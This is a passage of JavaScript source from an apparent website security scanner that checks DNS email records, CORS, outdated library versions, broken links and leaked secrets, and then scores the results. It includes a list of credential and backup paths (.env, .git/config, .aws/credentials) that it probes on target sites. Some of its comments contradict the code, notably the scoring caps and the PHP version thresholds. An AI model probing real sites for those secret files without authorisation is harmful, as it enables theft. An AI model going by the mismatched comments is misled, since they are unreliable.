
  async function txt(name) {
    try { return (await dns.resolveTxt(name)).map((r) => r.join('')).join(' '); }
    catch (e) { return ''; }
  }

  // Check the host AND its organisation domain; a record on either counts.
  const org = registrableDomain(hostname);
  const names = org && org !== hostname ? [hostname, org] : [hostname];

  // Concatenate TXT records across the host AND its org domain. Returning the
  // first non-empty set would let an unrelated subdomain TXT record (e.g. a
  // site-verification string on `www.example.com`) mask the org-level SPF/DMARC
  // record on `example.com` — a false negative.
  async function txtAny(prefix, suffix) {
    const found = await Promise.all(names.map((n) => txt(prefix + n + (suffix || ''))));
    return found.filter(Boolean).join(' ');
  }

  const [rootTxt, dmarcTxt, mtaStsTxt, tlsRptTxt, dnssec] = await Promise.all([
    txtAny(''),
    txtAny('_dmarc.', ''),
    txtAny('_mta-sts.', ''),
    txtAny('_smtp._tls.', ''),
    dnssecSigned(names),
  ]);

  const spf = /v=spf1/i.test(rootTxt);
  const dmarc = /v=DMARC1/i.test(dmarcTxt);
  const mtaSts = /v=STSv1/i.test(mtaStsTxt);
  const tlsRpt = /v=TLSRPTv1/i.test(tlsRptTxt);
  let caa = false;
  let hasMx = false;
  for (const n of names) {
    try { if ((await dns.resolveCaa(n)).length > 0) { caa = true; break; } } catch (e) { /* ignore */ }
  }
  for (const n of names) {
    try {
      const mxRecords = await dns.resolveMx(n);
      // RFC 7505 null MX (`0 .`) explicitly declares the domain accepts no mail.
      const realMx = (mxRecords || []).filter((r) => r && r.exchange && r.exchange !== '.' && r.exchange !== '');
      if (realMx.length > 0) { hasMx = true; break; }
    } catch (e) { /* ignore */ }
  }
  meta.dns = { spf, dmarc, mtaSts, tlsRpt, caa, dnssec, hasMx, checkedHost: hostname, orgDomain: org };

  if (!spf) {
    findings.push(makeFinding({
      id: 'dns-spf', domain: 'security', severity: 'medium',
      title: 'No SPF record (email spoofing possible)',
      detail: `No SPF record was found on ${org}. Anyone can send email claiming to be from this domain without it being flagged.`,
      fix: `Add a TXT record: \`v=spf1 include:<your-mail-provider> -all\` on ${org}.`,
      evidence: `checked: ${names.join(', ')}`,
    }));
  }
  if (!dmarc) {
    findings.push(makeFinding({
      id: 'dns-dmarc', domain: 'security', severity: 'medium',
      title: 'No DMARC policy',
      detail: `No DMARC record was found on ${org}. Receivers have no instructions for handling forged mail from this domain.`,
      fix: `Publish \`_dmarc\` TXT: \`v=DMARC1; p=quarantine; rua=mailto:dmarc@${org}\`.`,
      evidence: `checked: ${names.join(', ')}`,
    }));
  }
  if (!caa) {
    findings.push(makeFinding({
      id: 'dns-caa', domain: 'security', severity: 'low',
      title: 'No CAA record',
      detail: 'No restriction on which certificate authorities may issue certs for this domain.',
      fix: 'Add a CAA record authorizing only your CA, e.g. `0 issue "letsencrypt.org"`.',
    }));
  }
  // RFC 8461 (MTA-STS) and RFC 8460 (TLS-RPT) govern inbound SMTP to MX hosts.
  // If a domain has no MX records (does not receive inbound email), MTA-STS and
  // TLS-RPT are inapplicable and must not be flagged as missing.
  if (hasMx && !mtaSts) {
    findings.push(makeFinding({
      id: 'dns-mta-sts', domain: 'security', severity: 'low',
      title: 'No MTA-STS policy (mail TLS not enforced)',
      detail: 'Without MTA-STS, inbound mail can be delivered over a downgraded, unencrypted channel.',
      fix: 'Publish `_mta-sts` TXT `v=STSv1; id=<timestamp>;` and serve /.well-known/mta-sts.txt.',
    }));
  }
  if (hasMx && !tlsRpt) {
    findings.push(makeFinding({
      id: 'dns-tls-rpt', domain: 'security', severity: 'info',
      title: 'No TLS-RPT reporting',
      detail: 'You will not be alerted when inbound mail TLS fails or is downgraded.',
      fix: 'Publish `_smtp._tls` TXT: `v=TLSRPTv1; rua=mailto:tlsrpt@' + hostname + '`.',
    }));
  }
  if (dnssec === false) {
    findings.push(makeFinding({
      id: 'dns-dnssec', domain: 'security', severity: 'info',
      title: 'DNSSEC is not enabled',
      detail: 'Without DNSSEC, DNS answers can be spoofed/cache-poisoned en route.',
      fix: 'Enable DNSSEC at your registrar and publish the DS record.',
    }));
  }
}

function checkCors(res, findings, meta) {
  const h = res.headers;
  const acao = h['access-control-allow-origin'];
  const acac = h['access-control-allow-credentials'];
  if (!acao) return;
  meta.cors = { origin: acao, credentials: acac || null };
  if (acao === '*' && String(acac).toLowerCase() === 'true') {
    findings.push(makeFinding({
      id: 'cors-wildcard-credentials', domain: 'security', severity: 'high',
      title: 'CORS allows any origin with credentials',
      detail: 'Access-Control-Allow-Origin: * combined with Allow-Credentials: true lets any site read authenticated responses.',
      fix: 'Reflect only trusted origins and drop the wildcard when credentials are allowed.',
      evidence: `Access-Control-Allow-Origin: ${acao}\nAccess-Control-Allow-Credentials: ${acac}`,
    }));
  } else if (acao === '*') {
    findings.push(makeFinding({
      id: 'cors-wildcard', domain: 'security', severity: 'low',
      title: 'CORS is wide open (Access-Control-Allow-Origin: *)',
      detail: 'Any website can read responses from this endpoint. Safe only for fully public data.',
      fix: 'Restrict to the origins that actually need access.',
      evidence: `Access-Control-Allow-Origin: ${acao}`,
    }));
  }
}

// Common sensitive paths — one HEAD/GET each, only reported when they answer 200.
const EXPOSED_PATHS = [
  '/.env', '/.git/HEAD', '/.git/config', '/.DS_Store', '/config.json',
  '/wp-config.php.bak', '/backup.zip', '/backup.sql', '/database.sql',
  '/.aws/credentials', '/server-status', '/phpinfo.php', '/.svn/entries',
];

async function checkPathExposure(origin, findings, meta) {
  const results = [];
  await Promise.all(EXPOSED_PATHS.map(async (p) => {
    try {
      const r = await rawRequest(new URL(p, origin).toString(), { maxRedirects: 0 });
      if (r.status !== 200 || !r.body || !r.body.length) return;
      // Guard against SPA soft-404s: many apps answer 200 + the HTML shell for
      // ANY path. A real .env/.git/backup is never an HTML document.
      const ctype = String((r.headers && r.headers['content-type']) || '').toLowerCase();
      const looksHtml = ctype.includes('text/html') ||
        /^\s*(?:<!doctype|<html)/i.test(r.body.slice(0, 200));
      if (looksHtml) return;
      results.push({ path: p, bytes: r.bytes });
    } catch (e) { /* ignore unreachable */ }
  }));
  if (!results.length) return;
  meta.exposedPaths = results.map((r) => r.path);
  findings.push(makeFinding({
    id: 'exposed-path', domain: 'security', severity: 'critical',
    title: `${results.length} sensitive path(s) publicly reachable`,
    detail: 'Files that should never be web-accessible are being served.',
    fix: 'Block these paths at the web server / CDN and remove the files from the web root.',
    evidence: results.map((r) => `${r.path}  (HTTP 200, ${r.bytes} bytes)`).join('\n'),
  }));
}

function decodeHtmlAttr(s) {
  return String(s || '')
    .replace(/&amp;/gi, '&')
    .replace(/&#38;/g, '&')
    .replace(/&#x26;/gi, '&');
}

function collectScripts(body, origin) {
  const urls = new Set();
  const re = /<script\b[^>]*\bsrc\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\s"'>]+))/gi;
  let m;
  while ((m = re.exec(body))) {
    const src = decodeHtmlAttr((m[1] || m[2] || m[3] || '').trim());
    if (!src || /^data:/i.test(src)) continue;
    try { urls.add(new URL(src, origin).toString()); } catch (e) { /* ignore */ }
  }
  return [...urls];
}

async function checkJsBundles(body, origin, findings, meta) {
  const scripts = collectScripts(body, origin);
  meta.scriptCount = Math.max(meta.scriptCount || 0, scripts.length);
  if (!scripts.length) return;

  const existing = new Set(meta.bundleUrls || []);
  const sameOrigin = scripts.filter((u) => {
    try { return new URL(u).origin === origin && !existing.has(u); } catch (e) { return false; }
  }).slice(0, 25);

  const bundles = [];
  await Promise.all(sameOrigin.map(async (url) => {
    try {
      const r = await rawRequest(url, { maxRedirects: 2 });
      if (r.status === 200 && r.body) {
        bundles.push({ url, body: r.body });
        const sec = scanSecrets(r.body);
        if (sec.length) {
          findings.push(makeFinding({
            id: 'js-secret', domain: 'security', severity: 'critical',
            title: 'Secrets found in a JavaScript bundle',
            detail: 'Credentials shipped to the browser are downloadable by anyone.',
            fix: 'Move secrets server-side; use short-lived tokens or a backend proxy.',
            evidence: url + '\n' + sec.join('\n'),
          }));
        }
      }
    } catch (e) { /* ignore */ }
  }));

  // Extract interesting API endpoints discovered in bundles.
  const endpoints = new Set(meta.endpoints || []);
  const epRe = /["'`](\/(?:api|v\d+|graphql|rest)\/[A-Za-z0-9/_\-.{}$:]+)["'`]/g;
  for (const b of bundles) {
    let m;
    while ((m = epRe.exec(b.body))) endpoints.add(m[1]);
  }
  meta.endpoints = [...endpoints].slice(0, 40);
  // Hand the fetched bundle text to the Phase 6 probes (bucket/key/WS/PII scan).
  const newJsText = bundles.map((b) => b.body).join('\n');
  meta.jsBundleText = meta.jsBundleText ? (meta.jsBundleText + '\n' + newJsText) : newJsText;
  meta.bundleUrls = [...(meta.bundleUrls || []), ...bundles.map((b) => b.url)];
}

async function checkBrokenLinks(body, origin, findings, meta) {
  const links = new Set();
  const re = /<a\b[^>]*\bhref\s*=\s*(?:"([^"]+)"|'([^']+)'|([^\s"'>]+))/gi;
  let m;
  let count = 0;
  while ((m = re.exec(body)) && count < 40) {
    const href = decodeHtmlAttr((m[1] || m[2] || m[3] || '').trim());
    if (!href || /^(?:#|mailto:|tel:|javascript:|data:)/i.test(href)) continue;
    try {
      const u = new URL(href, origin);
      if (u.origin === origin) { links.add(u.pathname + u.search); count++; }
    } catch (e) { /* ignore */ }
  }
  const list = [...links].slice(0, 20);
  const broken = [];
  await Promise.all(list.map(async (p) => {
    try {
      let r = await rawRequest(new URL(p, origin).toString(), { method: 'HEAD', maxRedirects: 2 });
      // Some servers reject HEAD (405/501) — retry with GET before calling it broken.
      if (r.status === 405 || r.status === 501) {
        r = await rawRequest(new URL(p, origin).toString(), { method: 'GET', maxRedirects: 2 });
      }
      if (r.status === 404 || r.status === 410 || r.status >= 500) {
        broken.push(`${r.status}  ${p}`);
      }
    } catch (e) { broken.push(`ERR  ${p}`); }
  }));
  meta.linksChecked = list.length;
  if (broken.length) {
    findings.push(makeFinding({
      id: 'broken-link', domain: 'quality', severity: 'medium',
      title: `${broken.length} broken internal link(s)`,
      detail: 'Internal links that return an error hurt UX and SEO crawl budget.',
      fix: 'Fix or redirect the listed URLs.',
      evidence: broken.join('\n'),
    }));
  }
}

function checkTech(res, body, findings, meta) {
  const tech = detectTech(res, body);
  meta.tech = tech;

  const headers = res.headers || {};
  const serverHeader = (headers.server || headers['x-powered-by'] || '');
  const allHeadersStr = JSON.stringify(headers);

  // 1. General Server Version Disclosures
  if (/\/[0-9]+\.[0-9]+/.test(serverHeader)) {
    findings.push(makeFinding({
      id: 'server-version-leak', domain: 'security', severity: 'low',
      title: 'Server version disclosed in HTTP headers',
      detail: `Header discloses exact version: "${serverHeader}". Attackers use exact version strings to target unpatched CVEs.`,
      fix: 'Configure your web server to suppress detailed version banners (e.g. server_tokens off in nginx).',
      evidence: serverHeader,
    }));
  }

  // 2. PHP Runtime Vulnerabilities (including 2024-2026 EOL and RCE CVEs)
  const phpMatch = serverHeader.match(/PHP\/(\d+)\.(\d+)(?:\.(\d+))?/i) || allHeadersStr.match(/PHP\/(\d+)\.(\d+)(?:\.(\d+))?/i);
  if (phpMatch) {
    const major = parseInt(phpMatch[1], 10);
    const minor = parseInt(phpMatch[2], 10);
    const ver = phpMatch[0];
    if (major < 8 || (major === 8 && minor === 0)) {
      findings.push(makeFinding({
        id: 'vuln-php-eol', domain: 'security', severity: 'high',
        title: `End-of-Life PHP runtime (${ver}) with known critical CVEs`,
        detail: `The server discloses ${ver}. PHP versions prior to 8.2 are completely end-of-life and susceptible to critical vulnerabilities such as CVE-2024-4577 (Windows CGI argument injection RCE), CVE-2024-8926, and CVE-2024-9026.`,
        fix: 'Upgrade immediately to an actively supported PHP branch (PHP 8.2 or 8.3+) and set expose_php = Off in php.ini.',
        evidence: ver,
      }));
    } else if (major === 8 && minor === 1) {
      findings.push(makeFinding({
        id: 'vuln-php-81-eol', domain: 'security', severity: 'medium',
        title: `End-of-Life PHP 8.1 runtime (${ver})`,
        detail: `PHP 8.1 reached official End-of-Life in November 2024 and no longer receives upstream security updates.`,
        fix: 'Upgrade to PHP 8.2+ or 8.3+ and set expose_php = Off in php.ini.',
        evidence: ver,
      }));
    }
  }

  // 3. Apache HTTP Server Outdated (< 2.4.60)
  const apacheMatch = serverHeader.match(/Apache\/2\.4\.(\d+)/i) || allHeadersStr.match(/Apache\/2\.4\.(\d+)/i);
  if (apacheMatch) {
    const patch = parseInt(apacheMatch[1], 10);
    if (patch < 60) {
      const ver = apacheMatch[0];
      findings.push(makeFinding({
        id: 'vuln-apache-outdated', domain: 'security', severity: 'medium',
        title: `Vulnerable Apache HTTP Server version (${ver})`,
        detail: `Apache ${ver} is affected by multiple security vulnerabilities (including CVE-2024-38472 SSRF, CVE-2024-38475 architecture-level bypass, and CVE-2024-39573 proxy escape).`,
        fix: 'Upgrade Apache to 2.4.62+ and set ServerTokens Prod in your server configuration.',
        evidence: ver,
      }));
    }
  }

  // 4. Node.js Outdated (< 20.x)
  const nodeMatch = serverHeader.match(/Node(?:\.js)?\/?\s*v?(\d+)\.(\d+)/i) || allHeadersStr.match(/Node(?:\.js)?\/?\s*v?(\d+)\.(\d+)/i);
  if (nodeMatch) {
    const major = parseInt(nodeMatch[1], 10);
    if (major < 20) {
      const ver = nodeMatch[0];
      findings.push(makeFinding({
        id: 'vuln-nodejs-eol', domain: 'security', severity: 'medium',
        title: `End-of-Life Node.js runtime (${ver})`,
        detail: `Node.js releases prior to v20 are End-of-Life and miss security fixes (including October 2026 HTTP request smuggling and permission model flaws).`,
        fix: 'Upgrade to active LTS (Node.js 20 or 22) and suppress framework headers via app.disable("x-powered-by").',
        evidence: ver,
      }));
    }
  }

  // 5. Nginx Outdated (< 1.26.1)
  const nginxMatch = serverHeader.match(/nginx\/1\.(\d+)\.(\d+)/i) || allHeadersStr.match(/nginx\/1\.(\d+)\.(\d+)/i);
  if (nginxMatch) {
    const minor = parseInt(nginxMatch[1], 10);
    const patch = parseInt(nginxMatch[2], 10);
    if (minor < 26 || (minor === 26 && patch < 1) || (minor === 27 && patch < 1)) {
      const ver = nginxMatch[0];
      findings.push(makeFinding({
        id: 'vuln-nginx-outdated', domain: 'security', severity: 'low',
        title: `Outdated Nginx version (${ver})`,
        detail: `Nginx ${ver} lacks recent worker reliability and HTTP/2/3 patches (e.g. CVE-2024-34161).`,
        fix: 'Upgrade Nginx to the latest stable release (1.26.2+ / 1.28+) and ensure server_tokens off; is set.',
        evidence: ver,
      }));
    }
  }

  // 6. Known Vulnerable Client Libraries from HTML scripts
  const cleanBody = body || '';
  const jqMatch = cleanBody.match(/jquery[.-](1\.[0-9]+(?:\.[0-9]+)?|2\.[0-9]+(?:\.[0-9]+)?|3\.[0-4](?:\.[0-9]+)?)(?:\.min)?\.js/i);
  if (jqMatch) {
    findings.push(makeFinding({
      id: 'vuln-jquery-outdated', domain: 'security', severity: 'medium',
      title: `Vulnerable jQuery version (${jqMatch[1]})`,
      detail: `The page loads jQuery ${jqMatch[1]}. Versions prior to 3.5.0 contain known Cross-Site Scripting (XSS) vulnerabilities in htmlPrefilter (CVE-2020-11022, CVE-2020-11023).`,
      fix: 'Upgrade jQuery to version 3.7.1+ or migrate to native DOM APIs.',
      evidence: jqMatch[0],
    }));
  }

  if (/angular(?:\.min)?\.js|ng-version=["']1\./i.test(cleanBody)) {
    findings.push(makeFinding({
      id: 'vuln-angularjs-eol', domain: 'security', severity: 'medium',
      title: 'End-of-Life AngularJS 1.x detected',
      detail: 'AngularJS 1.x reached official End-of-Life on December 31, 2021. It has numerous known client-side template injection and sandbox escape XSS vulnerabilities.',
      fix: 'Migrate legacy AngularJS components to modern supported frameworks (React, Vue, Svelte, or modern Angular).',
      evidence: 'AngularJS 1.x script or ng-version marker detected in DOM',
    }));
  }

  // 7. Malicious Supply Chain: Polyfill.io / BootCDN / BootCSS (CVE-2024-38521)
  const polyfillMatch = cleanBody.match(/(?:https?:)?\/\/(?:[a-zA-Z0-9-]+\.)?(?:polyfill\.io|bootcdn\.net|bootcss\.com)[^\s"'>]*/i);
  if (polyfillMatch) {
    findings.push(makeFinding({
      id: 'vuln-polyfill-malicious', domain: 'security', severity: 'critical',
      title: 'Malicious supply chain dependency (Polyfill.io / BootCDN)',
      detail: `The page loads scripts from a known compromised domain (${polyfillMatch[0]}). The polyfill.io service was acquired by a rogue entity in 2024 and observed distributing malware and unauthorized redirects to mobile visitors (CVE-2024-38521).`,
      fix: 'Remove references to polyfill.io immediately. Migrate to Cloudflare\'s secure mirror (cdnjs.cloudflare.com/polyfill) or modern standard ECMAScript APIs.',
      evidence: polyfillMatch[0],
    }));
  }

  // 8. WordPress Core Outdated (< 6.6.2)
  const wpMatch = cleanBody.match(/<meta\s+name=["']generator["']\s+content=["']WordPress\s+(\d+)\.(\d+)(?:\.(\d+))?["']/i) ||
                  cleanBody.match(/wp-embed\.min\.js\?ver=(\d+)\.(\d+)(?:\.(\d+))?/i);
  if (wpMatch) {
    const wpMajor = parseInt(wpMatch[1], 10);
    const wpMinor = parseInt(wpMatch[2], 10);
    const wpPatch = wpMatch[3] ? parseInt(wpMatch[3], 10) : 0;
    const isOld = (wpMajor < 6) || (wpMajor === 6 && wpMinor < 6) || (wpMajor === 6 && wpMinor === 6 && wpPatch < 2);
    if (isOld) {
      const wpVer = `${wpMajor}.${wpMinor}${wpMatch[3] ? '.' + wpPatch : ''}`;
      findings.push(makeFinding({
        id: 'vuln-wordpress-outdated', domain: 'security', severity: wpMajor < 6 || (wpMajor === 6 && wpMinor < 5) ? 'high' : 'medium',
        title: `Outdated WordPress core (${wpVer})`,
        detail: `WordPress ${wpVer} is affected by multiple known security vulnerabilities, including CVE-2024-4439 (SSRF/code execution in avatar blocks) and CVE-2024-31210 (privilege escalation).`,
        fix: 'Upgrade WordPress core to the latest stable release (6.7+) immediately and enable automatic security updates.',
        evidence: wpMatch[0],
      }));
    }
  }

  // 9. Next.js Server Actions SSRF / Cache Poisoning (< 14.1.1)
  const nextDataMatch = cleanBody.match(/<script\s+id=["']__NEXT_DATA__["'][^>]*>(.*?)<\/script>/s);
  let nextVer = null;
  if (nextDataMatch) {
    try {
      const parsed = JSON.parse(nextDataMatch[1]);
      if (parsed && parsed.version) nextVer = String(parsed.version);
    } catch (_) {}
  }
  if (!nextVer && headers['x-nextjs-version']) {
    nextVer = String(headers['x-nextjs-version']);
  }
  if (nextVer) {
    const nextVm = nextVer.match(/^(\d+)\.(\d+)\.(\d+)/);
    if (nextVm) {
      const nMaj = parseInt(nextVm[1], 10);
      const nMin = parseInt(nextVm[2], 10);
      const nPat = parseInt(nextVm[3], 10);
      if (nMaj < 14 || (nMaj === 14 && (nMin === 0 || (nMin === 1 && nPat < 1)))) {
        findings.push(makeFinding({
          id: 'vuln-nextjs-ssrf', domain: 'security', severity: 'high',
          title: `Vulnerable Next.js version (${nextVer}) with Server Actions SSRF`,
          detail: `Next.js ${nextVer} is vulnerable to CVE-2024-34351 (Server-Side Request Forgery via Server Actions Host header manipulation) and cache poisoning flaws.`,
          fix: 'Upgrade Next.js to 14.2.15+ or 15.0+ to ensure Server Actions request origin validation is enforced.',
          evidence: `Next.js ${nextVer}`,
        }));
      }
    }
  }

  // 10. Lodash Outdated Prototype Pollution (< 4.17.21)
  const lodashMatch = cleanBody.match(/lodash[.-]([0-3]\.[0-9]+(?:\.[0-9]+)?|4\.(?:[0-9]|1[0-6])(?:\.[0-9]+)?|4\.17\.(?:[0-9]|1[0-9]|20))(?:\.min)?\.js/i);
  if (lodashMatch) {
    findings.push(makeFinding({
      id: 'vuln-lodash-outdated', domain: 'security', severity: 'medium',
      title: `Vulnerable Lodash version (${lodashMatch[1]})`,
      detail: `The page loads Lodash ${lodashMatch[1]}. Versions prior to 4.17.21 contain known Prototype Pollution vulnerabilities (CVE-2020-8203) and command injection in template compilation (CVE-2021-23337).`,
      fix: 'Upgrade Lodash to version 4.17.21+ or migrate to native JavaScript ES2022+ utility methods.',
      evidence: lodashMatch[0],
    }));
  }

  // 11. Bootstrap Outdated XSS (< 4.3.1 / 3.x)
  const bsMatch = cleanBody.match(/bootstrap[.-]([0-3]\.[0-9]+(?:\.[0-9]+)?|4\.[0-2](?:\.[0-9]+)?)(?:\.bundle)?(?:\.min)?\.(?:js|css)/i);
  if (bsMatch) {
    findings.push(makeFinding({
      id: 'vuln-bootstrap-outdated', domain: 'security', severity: 'medium',
      title: `Vulnerable Bootstrap library version (${bsMatch[1]})`,
      detail: `Bootstrap ${bsMatch[1]} contains known Cross-Site Scripting (XSS) vulnerabilities in tooltip, popover, and scrollspy data-attributes (CVE-2019-8331, CVE-2018-14041).`,
      fix: 'Upgrade Bootstrap to version 5.3+ or update to the patched 4.6.2 release.',
      evidence: bsMatch[0],
    }));
  }

  // 12. Moment.js Outdated ReDoS (< 2.29.4)
  const momentMatch = cleanBody.match(/moment[.-]([0-1]\.[0-9]+(?:\.[0-9]+)?|2\.(?:[0-9]|1[0-9]|2[0-8])(?:\.[0-9]+)?)(?:\.min)?\.js/i);
  if (momentMatch) {
    findings.push(makeFinding({
      id: 'vuln-moment-redos', domain: 'security', severity: 'low',
      title: `Outdated Moment.js library (${momentMatch[1]})`,
      detail: `Moment.js ${momentMatch[1]} is susceptible to Regular Expression Denial of Service (ReDoS) and path traversal in locale handling (CVE-2022-31129, CVE-2022-24785).`,
      fix: 'Upgrade Moment.js to 2.30.1+ or replace with lightweight alternatives like Day.js or native Intl APIs.',
      evidence: momentMatch[0],
    }));
  }

  // 13. Axios Outdated Client Library (< 1.7.4)
  const axiosMatch = cleanBody.match(/axios[.-](0\.[0-9]+(?:\.[0-9]+)?|1\.[0-6](?:\.[0-9]+)?|1\.7\.[0-3])(?:\.min)?\.js/i);
  if (axiosMatch) {
    findings.push(makeFinding({
      id: 'vuln-axios-outdated', domain: 'security', severity: 'medium',
      title: `Outdated Axios library (${axiosMatch[1]})`,
      detail: `Axios ${axiosMatch[1]} contains known SSRF bypass vulnerabilities (CVE-2024-39338) and cross-origin credential disclosure during redirects (CVE-2023-45857).`,
      fix: 'Upgrade Axios to version 1.7.7+ or use the native fetch API.',
      evidence: axiosMatch[0],
    }));
  }
}

/* ------------------------------------------------------------------ *
 * Scoring
 * ------------------------------------------------------------------ */

function gradeFor(score) {
  if (score >= 90) return 'A';
  if (score >= 80) return 'B';
  if (score >= 70) return 'C';
  if (score >= 55) return 'D';
  return 'F';
}

/** Penalty → 0–100 score for an arbitrary subset of findings. */
function penaltyToScore(list) {
  const penalty = list.reduce((sum, f) => sum + (SEVERITY_WEIGHT[f.severity] || 0), 0);
  return Math.max(0, Math.min(100, 100 - penalty));
}

/**
 * Overall score (Scoring v2).
 *
 * The old model was a flat penalty sum across *all* findings clamped at 0.
 * That made the headline number meaningless: a site could score A/B in five of
 * six domains and still show "0 — grade F", because ~30 low/info hygiene notes
 * plus two medium issues already exceed 100 penalty. It also contradicted the
 * per-domain scorecard sitting directly above it.
 *
 * Now the overall score is the mean of the per-domain scores (so the domains
 * with no findings pull it up, exactly as the scorecard implies), then a
 * severity ceiling is applied so a genuine critical/high issue can never be
 * hidden behind a good average:
 *   - any critical           → cap at 69 (C)
 *   - 2+ high                → cap at 74 (C)
 *   - exactly 1 high         → cap at 84 (B)
 * The raw flat penalty is still reported as `penalty` for callers that want it.
 */
function scoreCeiling(findings) {
  const n = (sev) => findings.filter((f) => f.severity === sev).length;
  if (n('critical') > 0) return 69;
  if (n('high') >= 4) return 74;
  if (n('high') >= 2) return 82;
  if (n('high') === 1) return 88;
  return 100;
}

function scoreFindings(findings) {
  const domains = scoreByDomain(findings);
  const keys = Object.keys(domains);
  const mean = keys.length
    ? Math.round(keys.reduce((s, k) => s + domains[k].score, 0) / keys.length)
    : 100;
  const ceiling = scoreCeiling(findings);
  const score = Math.max(0, Math.min(100, Math.min(mean, ceiling)));
  return { score, grade: gradeFor(score), penalty: penaltyFlat(findings), domainScore: mean };
}

/** Raw flat penalty (severity sum) — kept for transparency / exports. */
function penaltyFlat(findings) {
  return findings.reduce((sum, f) => sum + (SEVERITY_WEIGHT[f.severity] || 0), 0);
}

/**
 * Per-domain breakdown (Scoring v2). The overall score stays the flat
 * penalty model (so nothing regresses); each domain is scored on its own
 * findings only, which lets the UI show *where* the problems live instead of
 * a single opaque number.
 */
const SCORE_DOMAINS = ['security', 'compliance', 'performance', 'accessibility', 'seo', 'quality'];

function scoreByDomain(findings) {
  const out = {};
  for (const d of SCORE_DOMAINS) {
    const list = findings.filter((f) => f.domain === d);
    const p = list.reduce((s, f) => s + (SEVERITY_WEIGHT[f.severity] || 0), 0);
    const score = penaltyToScore(list);
    out[d] = {
      score,
      grade: gradeFor(score),
      counts: list.reduce((acc, f) => { acc[f.severity] = (acc[f.severity] || 0) + 1; return acc; }, {}),
      total: list.length,
      penalty: p,
    };
  }
  return out;
}

/* ------------------------------------------------------------------ *
 * Public entrypoint
 * ------------------------------------------------------------------ */

// Per-page sweep shared by the root page and every crawled page.
function runPageChecks(res) {
  const f = [];
  const m = {};
  checkTransport(res, f, m);
  checkSecurityHeaders(res, f);
  checkModernHeaders(res, f, m);
  checkCookies(res, f, m);
  checkBody(res.body, res, f, m);
  checkCors(res, f, m);
  checkTech(res, res.body, f, m);
  return { findings: f, meta: m };
}

/**
 * De-duplicate per-page findings across a crawl. Identical issue IDs collapse
 * into one finding; the list of affected URLs is attached as evidence so the
 * report stays readable instead of repeating "3 images without alt" N times.
 */
function mergePageFindings(rootFindings, pageResults) {
  const byId = new Map();
  for (const f of rootFindings) byId.set(f.id, { finding: f, pages: [] });

  for (const pr of pageResults) {
    for (const f of pr.findings) {
      const entry = byId.get(f.id);
      if (entry) {
        entry.pages.push(pr.url);
      } else {
        byId.set(f.id, { finding: f, pages: [pr.url] });
      }
    }
  }

  const merged = [];
  for (const { finding, pages } of byId.values()) {
    if (pages.length) {
      const uniq = [...new Set(pages)].slice(0, 12);
      finding.evidence = (finding.evidence ? finding.evidence + '\n' : '') +
        `Also found on ${uniq.length} page(s):\n` + uniq.join('\n');
    }
    merged.push(finding);
  }
  return merged;
}

/* ------------------------------------------------------------------ *
 * Phase 3–7 module runners
 * ------------------------------------------------------------------ */

// Run a best-effort check block; never let a module bug abort the scan.
function safeRun(fn, label, meta) {
  try {
    fn();
  } catch (e) {
    meta.moduleErrors = meta.moduleErrors || {};
    meta.moduleErrors[label] = e.message;
  }
}

/**
 * Phase 7 / Performance — Google CrUX / PageSpeed Field Data (28-day Chrome user sample).
 * Best-effort external API lookup with a 5s timeout. If Google rate-limits,
 * times out, or fails, the main scan completes unaffected.
 */
async function checkGoogleCrux(targetUrl, findings, meta, mkSeo, mkPerf) {
  try {
    const apiKey = process.env.PAGESPEED_API_KEY || process.env.CRUX_API_KEY || process.env.GOOGLE_API_KEY || '';
    let apiUrl = `https://www.googleapis.com/pagespeedonline/v5/runPagespeed?url=${encodeURIComponent(targetUrl)}&strategy=mobile`;
    if (apiKey) apiUrl += `&key=${encodeURIComponent(apiKey)}`;

    const res = await fetch(apiUrl, {
      signal: AbortSignal.timeout(5000),
      headers: { 'Accept': 'application/json', 'User-Agent': UA },
    });

    if (!res.ok) {
      meta.crux = { category: 'UNAVAILABLE', reason: 'Api unavailable or rate limited' };
      return;
    }
    const data = await res.json();
    const exp = data && (data.loadingExperience || data.originLoadingExperience);
    const overall = exp && (exp.overall_category || '').toUpperCase();
    if (!exp || !overall || overall === 'NONE') {
      meta.crux = { category: 'INSUFFICIENT_DATA', label: 'Ni zadostnega 28d obiska za terenski vzorec' };
      return;
    }

    const metrics = {};
    if (exp.metrics) {
      if (exp.metrics.LARGEST_CONTENTFUL_PAINT_MS && exp.metrics.LARGEST_CONTENTFUL_PAINT_MS.percentile != null) {
        metrics.lcp = exp.metrics.LARGEST_CONTENTFUL_PAINT_MS.percentile;
      }
      if (exp.metrics.INTERACTION_TO_NEXT_PAINT && exp.metrics.INTERACTION_TO_NEXT_PAINT.percentile != null) {
        metrics.inp = exp.metrics.INTERACTION_TO_NEXT_PAINT.percentile;
      }
      if (exp.metrics.CUMULATIVE_LAYOUT_SHIFT_SCORE && exp.metrics.CUMULATIVE_LAYOUT_SHIFT_SCORE.percentile != null) {
        const rawCls = exp.metrics.CUMULATIVE_LAYOUT_SHIFT_SCORE.percentile;
        metrics.cls = rawCls > 2 ? rawCls / 100 : rawCls;
      }
    }

    meta.crux = { category: overall, metrics };

    const parts = [];
    if (metrics.lcp != null) parts.push(`LCP: ${metrics.lcp}ms`);
    if (metrics.inp != null) parts.push(`INP: ${metrics.inp}ms`);
    if (metrics.cls != null) parts.push(`CLS: ${Number(metrics.cls).toFixed(2)}`);
    const ev = parts.length ? `Google CrUX 28-day field percentiles: ${parts.join(', ')} (Category: ${overall})` : `Google CrUX Category: ${overall}`;

    if (overall === 'FAST') {
      findings.push(mkSeo(
        'crux-field-fast',
        'info',
        'Passes Google Core Web Vitals assessment in real-user field data (CrUX)',
        'Google CrUX 28-day data confirms real Chrome users experience fast loading and smooth interactivity on mobile devices.',
        'Maintain current frontend performance optimizations, caching, and asset budgets.',
        ev
      ));
    } else if (overall === 'SLOW') {
      findings.push(mkPerf(
        'crux-field-slow',
        'low',
        'Fails Google Core Web Vitals assessment in real-user field data (CrUX)',
        '28-day Chrome user field data shows significant user experience bottlenecks, which directly damages Google search ranking.',
        'Optimize LCP (compress hero images, preload critical fonts), eliminate long main-thread tasks to lower INP, and reserve layout dimensions to prevent CLS.',
        ev
      ));
    }
  } catch (e) {
    if (!meta.crux) {
      meta.crux = { category: 'UNAVAILABLE', reason: e.message || 'Lookup timeout or error' };
    }
  }
}

// Phase 6 — active-but-safe security surface (skipped when skipActive is true).
// All probes are non-destructive GET/HEAD/OPTIONS indicators using rawRequest.
async function runProbes(html, origin, findings, meta, primaryIp, bypassProxy = false, skipActive = false) {
  const jsText = meta.jsBundleText || '';
